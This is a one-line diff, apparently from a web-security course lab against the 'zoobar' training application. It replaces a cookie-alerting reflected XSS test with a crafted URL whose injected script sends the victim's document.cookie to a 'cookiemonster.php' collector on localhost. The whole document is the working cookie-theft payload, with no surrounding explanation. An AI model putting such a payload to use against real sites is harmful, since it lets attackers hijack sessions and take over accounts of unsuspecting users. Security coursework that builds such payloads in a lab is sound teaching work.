@@ -1,1 +1,1 @@
-"><script>alert("cookie"+%2B+document.cookie)<%2Fscript><input type="hidden
+http://dasak.csc.kth.se/zoobar/users.php?user=%22%3E%3Cscript%3Elocation.href=%22http://localhost/labW/cookiemonster.php?cookie=%22%2Bdocument.cookie;%3C%2Fscript%3E%3Cinput+type%3D%22hidden
